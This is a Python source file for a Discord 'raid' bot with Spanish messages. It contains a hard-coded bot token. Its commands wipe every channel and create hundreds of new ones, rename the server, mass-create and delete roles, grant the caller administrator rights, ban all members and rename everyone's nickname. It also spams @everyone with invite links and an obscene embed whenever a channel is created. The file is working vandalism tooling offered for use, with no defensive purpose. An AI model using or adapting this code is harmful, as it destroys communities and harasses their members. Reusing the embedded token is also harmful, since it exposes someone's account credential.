Olaimport discord
from discord.ext import commands
from discord.ext.commands import bot
import colorama
from colorama import Fore
import random

token = "MTA2NzA4MDIxNTU2MzYwODEyNA.GYTg95.1JqL1ju2PyEUfelScHBuPNleFzEdi7IB7SBeqU"



colors = {"main": Fore.RED,
          "white": Fore.WHITE,
          "red": Fore.RED}
msgs = {"info": f"{colors['white']}[{colors['main']}i{colors['white']}]",
        "+": f"{colors['white']}[{colors['main']}+{colors['white']}]",
        "error": f"{colors['white']}[{colors['red']}e{colors['white']}]",
        "input": f"{colors['red']}{colors['main']}>>{colors['red']}",
        "pressenter": f"{colors['red']}[{colors['main']}i{colors['red']}] Press ENTER to exit"}
        
intents = discord.Intents.all()
intents.members=True
bot = commands.Bot(command_prefix = ".", intents=intents)
bot.remove_command("help")
with open('image.jpg', 'rb') as f:
        icon = f.read()

@bot.event
async def on_ready():
 await bot.change_presence(status=discord.Status.dnd, activity=discord.Game('?'))    
 print(f'''

 ▄▄▄       ██ ▄█▀▓█████ ▓█████  ██▓    
▒████▄     ██▄█▒ ▓█   ▀ ▓█   ▀ ▓██▒    
▒██  ▀█▄  ▓███▄░ ▒███   ▒███   ▒██░    
░██▄▄▄▄██ ▓██ █▄ ▒▓█  ▄ ▒▓█  ▄ ▒██░    
 ▓█   ▓██▒▒██▒ █▄░▒████▒░▒████▒░██████▒
 ▒▒   ▓▒█░▒ ▒▒ ▓▒░░ ▒░ ░░░ ▒░ ░░ ▒░▓  ░
  ▒   ▒▒ ░░ ░▒ ▒░ ░ ░  ░ ░ ░  ░░ ░ ▒  ░
  ░   ▒   ░ ░░ ░    ░      ░     ░ ░   
      ░  ░░  ░      ░  ░   ░  ░    ░  ░
                                       

>bot creado por ᴀᶻᵏᵉᵉˡ
>Gracias por usar mi codigo
comandos :           >raid >mr >dr 
                     >admin >banall >nc >dc
prefix: >    
                                 by hades \n servers :{len(bot.guilds)}                            miembros :{len(bot.users)}''')

spam=(f"@everyone https://discord.gg/rAn4qyyedD   https://discord.gg/JmwrcmwZub")
@bot.event
async def on_guild_channel_create(channel):
 for i in range(0,17):
   embed=discord.Embed(title="Fucked By GalaxySq x OverSq", color=discord.Color.darker_grey())
   embed.set_image(url="https://images-ext-2.discordapp.net/external/rUzJOTVLNaRHfGdmFSbWKiWAb5rw9mZlguwSYnBUfHE/%3Fsize%3D1024/https/cdn.discordapp.com/icons/1010027766802042901/8357f693d586b960f927a337342ce903.png")
   await channel.send(spam,embed=embed)
   
@bot.command()
async def galaxy(ctx):
 nombre = "Dynamic On Top"
 await ctx.message.delete()
 await ctx.guild.edit(name = 'Dynamic wins ',icon=icon)
 for channel in ctx.guild.channels:
  try:
   await channel.delete()
   print(f"{msgs['+']} canal eliminado")
  except:   
   pass
 for i in range(0, 500):
       await ctx.guild.create_text_channel(nombre)
       print(f"{msgs['+']} canal creado")
 
@bot.command(name="massrol")
async def RolMasivo(ctx, amount: int = 247, *, name="#DynamicOnTop"):
    await ctx.message.delete()
    for i in range(amount):
        try:
            await ctx.guild.create_role(name=name, color=discord.Color.red())
            print(f"{msgs['+']} rol creado")
        except:
            print(f"{msgs['error']} no se pudo crear el rol")               
       
@bot.command(name='delrol')
async def EliminarRoles(ctx):
    await ctx.message.delete()
    for r in ctx.guild.roles:
        try:
            await r.delete()
            print(f"{msgs['+']} rol eliminado: {r}")
        except:
            print(f"{msgs['error']} no se pudo eliminar el rol: {r}")

@bot.command(name="admin")
async def admin(ctx, *, rolename="."):
    await ctx.message.delete()
    try:
        perms = discord.Permissions(administrator=True)
        role = await ctx.guild.create_role(name=rolename, permissions=perms)
        await ctx.message.author.add_roles(role)
        print(f"{msgs['+']} se le dio admin a {ctx.message.author}")
    except:
    	pass

@bot.command()
async def banall(ctx):
    await ctx.message.delete()
    for m in ctx.guild.members:
            try:
                await m.ban()
                print(f"{msgs['+']} member baneado: {m}")
            except:
            	pass
            
@bot.command()
async def nickall(ctx, *, name="#Dynamic"):
    await ctx.message.delete()
    for m in ctx.guild.members:
            try:
                await m.edit(nick=name)
                print(f"{msgs['+']} nick puesto a  {m}'s ")
            except:
            	pass

@bot.command()
async def h(ctx):
        author = ctx.author
        embedVar = discord.Embed(title="comandos", color=0xff0000)
        embedVar.add_field(name="Raid", value= '''```galaxy
massrol
delrol
admin
banall(banea a todos los usuarios) 
nickall(cambia el nombre de todos)```''', inline = False)
        embedVar.set_image(url="https://images-ext-1.discordapp.net/external/Fad3S24hpLMkm1lp3453PUFsgzAIuO27b7wf1LVUREU/https/c.tenor.com/rZI8abclYegAAAAC/galaxy-squad.gif?width=398&height=272")
        embedVar.set_footer(text=f"ByNinjabrine")
        await ctx.send(embed=embedVar)

bot.run(token)
